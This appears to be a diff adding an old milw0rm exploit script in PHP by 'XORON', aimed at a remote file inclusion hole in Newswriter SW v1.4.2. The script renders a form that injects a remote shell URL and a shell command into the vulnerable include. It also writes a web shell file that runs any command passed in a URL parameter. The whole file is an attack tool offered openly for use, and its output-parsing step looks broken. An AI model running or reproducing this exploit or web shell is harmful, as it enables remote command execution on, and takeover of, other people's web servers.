@@ -1,0 +1,69 @@
+<?php
+/* XORON - TURKISH HACKER
+
+Thanx: str0ke, Ironfist, Preddy,
+
+*/
+
+$cmd = $_POST["cmd"];
+$glowna = $_POST["glowna"];
+$shell = $_POST["shell"];
+$exp= "<title>Newswriter SW v1.4.2 Remote File Include Exploit :: XORON :: 
+TURKISH HACKER ::</title>"
+."<style type=\"text/css\">"
+."body {background-color: #006600;}"
+."body,td,th {color: #FFFFFF;}"
+."</style><form method=\"post\" action=\"".$glowna.$shell."?cmd=".$cmd."\">"
+."<div align=\"center\"><img src=\"http://xoron.biz/teamvh4.png\"></div>"
+."<p align=\"center\">script url: (ex. 
+http://www.site.com/[script_path]/include/main.inc.php?NWCONF_SYSTEM[server_path]=)<br>"
+."<input type=\"text\" name=\"glowna\" size=\"90\"".$glowna."\">"
+."<br>"
+."shell url: (ex. http://www.site.com/[path]/shell.txt?) shell.txt (CHMOD 
+777)<br>"
+."<input type=\"text\" name=\"shell\" size=\"90\"".$shell."\">"
+."<br>"
+."cmd: (ex. ls -la)<br>"
+."<input name=\"cmd\" type=\"text\" size=\"90\"".$cmd."\">"
+."<br>"
+."<input type=\"submit\" value=\"Exploit\" name=\"submit\">"
+."</p>"
+."<p align=\"center\">Find by: <a 
+href=\"mailto:x0r0n@hotmail.com\">XORON</a>"
+."<br>"
+."<p align=\"center\"> <a 
+href=\"http://www.xoron.biz/\">http://www.xoron.biz/</a></p>"
+."<p align=\"center\" class=\"name\">&nbsp;</p>"
+."<HR WIDTH=\"650\" ALIGN=\"center\">"
+."<p align=\"center\"> Special Greetz: Str0ke, Ironfist, Preddy, rgod  
+;-)<br>"
+."<br>"
+."<p align=\"center\">&nbsp;</p>"
+."</form>";
+
+if (!isset($_POST['submit']))
+{
+echo $exp;
+}else{
+$file = fopen ("shell.txt", "w+");
+fwrite($file, '<?php 
+ob_clean();echo"xoron-turkish-hacker";ini_set("max_execution_time",0);passthru($_GET["cmd"]);die;?>');
+fclose($file);
+$file = fopen ($shell, "r");
+if (!$file) {
+    echo "<p>Don't Find shell :( Insert in FTP shell.txt.\n";
+    exit;
+}
+echo $exp;
+while (!feof ($file)) {
+    $line .= fgets ($file, 1024)."<br>";
+    }
+$tpos1 = strpos($line, "++BEGIN++");
+$tpos2 = strpos($line, "++END++");
+$tpos1 = $tpos1+strlen("++BEGIN++");
+$tpos2 = $tpos2-$tpos1;
+$output = substr($line, $tpos1, $tpos2);
+}
+?>
+
+# milw0rm.com [2006-09-27]
